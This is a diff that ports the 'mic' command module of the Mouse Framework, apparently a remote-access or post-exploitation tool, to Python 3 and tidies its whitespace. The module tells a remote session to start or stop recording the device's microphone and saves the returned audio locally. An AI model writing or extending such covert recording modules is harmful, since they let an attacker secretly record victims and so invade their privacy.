@@ -1,7 +1,7 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
-#                              Mouse Framework                                 
+#                              Mouse Framework
 #            ---------------------------------------------------
 #                Copyright (C) <2019-2020>  <Entynetproject>
 #
@@ -27,9 +27,9 @@ class command:
     def __init__(self):
         self.name = "mic"
         self.description = "Record mic sound."
-        
+
     def run(self,session,cmd_data):
-        # #print output        
+        # #print output
         if cmd_data["args"] == "stop":
             # expect json
             result = json.loads(session.send_command(cmd_data))
@@ -45,8 +45,8 @@ class command:
                 f.write(data)
                 f.close()
                 h.info_general("Saved to downloads/{0}".format(file_name))
-            
+
         elif cmd_data["args"] == "start":
             h.info_general(session.send_command(cmd_data))
         else:
-            print "Usage: mic [start|stop]"
+            print("Usage: mic [start|stop]")
